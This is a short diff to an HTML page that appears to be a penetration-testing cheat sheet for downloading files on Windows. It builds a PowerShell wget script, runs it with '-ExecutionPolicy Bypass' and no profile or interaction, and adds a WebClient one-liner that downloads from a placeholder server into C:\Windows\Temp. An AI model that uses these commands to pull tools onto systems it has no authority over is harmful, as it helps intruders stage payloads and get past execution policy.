@@ -12,4 +12,10 @@ echo $file = "output-file.exe" &gt;&gt;wget.ps1<br/>
 echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1<br/>
 <br/>
 Now we invoke it with this crazy syntax:<br/>
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</body></html>
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1<br/>
+<br/>
+<br/>
+<br/>
+Alternative System.Net.WebClient one-liner<br/>
+(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") <br/>
+</body></html>
